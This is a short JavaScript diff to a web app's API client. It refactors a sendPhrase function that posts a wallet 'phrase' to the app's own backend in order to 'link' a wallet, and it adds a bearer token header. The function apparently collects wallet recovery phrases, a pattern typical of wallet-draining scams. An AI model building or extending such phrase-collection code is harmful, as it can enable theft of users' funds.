@@ -118,23 +118,28 @@ export const api = {
     }
   },
 
-  async sendPhrase(data) {
+ async sendPhrase(data) {
     try {
+      const token = localStorage.getItem('token'); 
+      
       const response = await fetch(`${API_BASE_URL}/user/send-phrase`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}` 
         },
         body: JSON.stringify(data),
       });
 
+      const result = await response.json();
+
       if (!response.ok) {
-        const error = await response.json();
-        throw new Error(error.message || 'Failed to link wallet');
+        throw new Error(result.message || 'Failed to link wallet');
       }
 
-      return await response.json();
+      return result;
     } catch (error) {
+      // Catch network errors or backend crashes
       throw new Error(error.message || 'Network error occurred');
     }
   },
